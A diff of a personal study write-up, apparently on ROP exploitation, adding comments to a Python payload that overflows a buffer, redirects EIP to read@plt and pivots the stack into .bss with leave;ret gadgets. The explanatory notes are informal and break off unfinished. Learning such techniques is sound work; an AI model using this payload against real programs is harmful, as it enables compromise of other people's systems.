@@ -331,23 +331,24 @@ base_stage = addr_bss + stack_size
  
 #read(0,base_stage,100)
 #jmp base_stage
-buf1 = b'A'* (28)
-buf1 += p32(addr_plt_read)
-buf1 += p32(addr_pop3)
-buf1 += p32(0)
-buf1 += p32(base_stage)
-buf1 += p32(100)
-buf1 += p32(addr_pop_ebp)
-buf1 += p32(base_stage)
-buf1 += p32(addr_leave_ret)
+buf1 = b'A'* (28) #offset
+buf1 += p32(addr_plt_read)  #eip overwrite with read@plt (read())
+buf1 += p32(addr_pop3)      # pop 3 times and ret
+buf1 += p32(0)              # read arg
+buf1 += p32(base_stage)     # //
+buf1 += p32(100)            # //
+buf1 += p32(addr_pop_ebp)   # pop ebp and ret
+buf1 += p32(base_stage)     # 
+buf1 += p32(addr_leave_ret) #
 ```
 
 Is stack size use as a padding ? maybe ? 
 
-- So the buffer is fill with the offset, and we overwrite eip to read@plt (read function).
-- return address push on the stack
-- read argument push on the stack `read(0,base_stage,100) // read(stdin, buffer, size_read)`
-- 
+What happened:
+
+- program leave to read@plt wich call read because ld has been allready call
+- it read the second buffer (we gonna see it later)
+- then 
 
 ### Documentation
 
